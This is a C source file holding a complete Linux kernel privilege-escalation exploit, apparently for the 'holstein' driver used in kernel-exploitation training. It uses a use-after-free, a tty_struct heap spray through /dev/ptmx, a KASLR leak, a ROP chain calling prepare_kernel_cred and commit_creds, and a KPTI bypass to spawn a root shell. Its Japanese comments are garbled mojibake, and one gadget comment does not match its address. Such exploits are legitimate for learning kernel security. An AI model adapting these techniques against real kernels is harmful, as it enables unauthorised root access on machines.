#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>

uintptr_t g_buf, kbase;

#define KADDR(addr) (addr - 0xffffffff81000000 + kbase)

#define ofs_tty_ops 0xc39c60
#define prepare_kernel_cred KADDR(0xffffffff81072560)
#define commit_creds KADDR(0xffffffff810723c0)
#define rop_bypass_kpti KADDR(0xffffffff81800e26)
// 0xffffffff81cdc7b9: pop rdi; ret;
#define rop_pop_rdi KADDR(0xffffffff8128dcfc)
// 0xffffffff8150b6d6: pop rcx; ret;
#define rop_pop_rcx KADDR(0xffffffff8150b6d6)
#define rop_mov_rdi_rax_rep_movsq KADDR(0xffffffff81638e9b)
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp KADDR(0xffffffff8114fbea)

void fatal(char* msg) {
  perror(msg);
  exit(1);
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

uintptr_t user_ss, user_rsp, user_rflags, user_cs;

static  void  save_state() {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3 \n"
      : "=r"(user_cs),
        "=r"(user_ss),
        "=r"(user_rsp),
        "=r"(user_rflags)
      :
      : "memory" );
}

int main() {
  save_state();

  // Use-after-Free��듁�뗣굮鵝쒌굥
  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  // tty_struct�췷pray
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // KASLR��썮��
  char buf[0x400];
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // ROP chain
  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // �퐐ty_operations
  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  // 2�욅쎅�췜se-after-Free
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // �€빊�녴꺖�뽧꺂��깮�ㅳ꺍�욍굮�멥걤�쎼걟��
  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  // RIP�뜹쐴
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }

  getchar();
  return 0;
}
